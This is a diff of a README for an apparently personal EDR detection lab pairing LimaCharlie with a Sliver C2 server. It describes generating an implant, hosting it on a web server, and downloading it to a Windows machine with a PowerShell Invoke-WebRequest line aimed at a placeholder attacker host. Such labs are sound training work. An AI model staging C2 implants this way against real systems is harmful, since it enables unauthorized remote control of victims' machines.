@@ -18,10 +18,14 @@ The architecture of the project consists of the following components:
 - LimaCharlieEDR
 - Silver C2 Server
 
+##Labbing
+
 After environment is set up I created a implant on the Ubuntu server to install on to the Windows System
+
 ![Implant](https://i.imgur.com/LEP0qSk.png)
 
 Next I created quick websever on the Ubuntu machine for the C2 Payload to be installed from, then I ran this command on the Windows device.
+
 ![IWR](https://i.imgur.com/dadsDeX.png)
 
 IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
